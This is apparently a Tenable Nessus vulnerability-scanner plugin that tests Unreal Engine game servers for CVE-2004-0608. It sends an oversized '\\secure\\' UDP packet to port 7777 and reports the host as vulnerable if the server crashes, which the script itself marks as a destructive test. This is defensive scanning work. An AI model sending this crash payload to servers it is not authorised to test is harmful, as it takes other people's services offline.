#
# (C) Tenable Network Security, Inc.
#

include("compat.inc");

if (description)
{
 script_id(12285);
 script_version("$Revision: 1.17 $");
 script_cvs_date("$Date: 2016/05/09 15:53:03 $");

 script_cve_id("CVE-2004-0608");
 script_bugtraq_id(10570);
 script_osvdb_id(7217);

 script_name(english:"Unreal Engine Secure Query Remote Overflow");
 script_summary(english:"Crashes the remote Unreal Engine Game Server");

 script_set_attribute(attribute:"synopsis", value:
"The remote host has an application that may arbitrary code execution on
the remote system.");
 script_set_attribute(attribute:"description", value:
"The remote host was running a game server with the Unreal Engine on it. 
The game server is vulnerable to a remote attack which allows for
arbitrary code execution. 

Note that Nessus disabled this service while testing for this flaw.");
 script_set_attribute(attribute:"solution", value:"Epic has released a patch for this issue.");
  script_set_cvss_base_vector("CVSS2#AV:N/AC:L/Au:N/C:C/I:C/A:C");
  script_set_cvss_temporal_vector("CVSS2#E:ND/RL:OF/RC:ND");
  script_set_attribute(attribute:"exploitability_ease", value:"Exploits are available");
  script_set_attribute(attribute:"exploit_available", value:"true");
  script_set_attribute(attribute:"metasploit_name", value:'Unreal Tournament 2004 "secure" Overflow (Win32)');
  script_set_attribute(attribute:"exploit_framework_metasploit", value:"true");
 script_set_attribute(attribute:"exploit_framework_canvas", value:"true");
 script_set_attribute(attribute:"canvas_package", value:'CANVAS');

 script_set_attribute(attribute:"vuln_publication_date", value:"2004/06/19");
 script_set_attribute(attribute:"plugin_publication_date", value:"2004/06/22");

 script_set_attribute(attribute:"plugin_type", value:"remote");
 script_end_attributes();

 script_category(ACT_DESTRUCTIVE_ATTACK);
 script_copyright(english:"This script is Copyright (C) 2004-2016 Tenable Network Security, Inc.");
 script_family(english:"Gain a shell remotely");

 exit(0);
}

include("audit.inc");

port = 7777;
if (!get_udp_port_state(port)) audit(AUDIT_PORT_CLOSED, port, "UDP");

soc = open_sock_udp(port);
if (!soc) audit(AUDIT_SOCK_FAIL, port, "UDP");

init = string("\\status\\");
malpacket = string("\\secure\\", crap(data:"a", length:1024) );

send(socket:soc, data:init);
r = recv(socket:soc, length:128);
if (r)
{
	send(socket:soc, data:malpacket);
	r = recv(socket:soc, length:128);
	if (! r)
	{
		security_hole(port:port, proto:"udp");
		exit(0);
	}
}
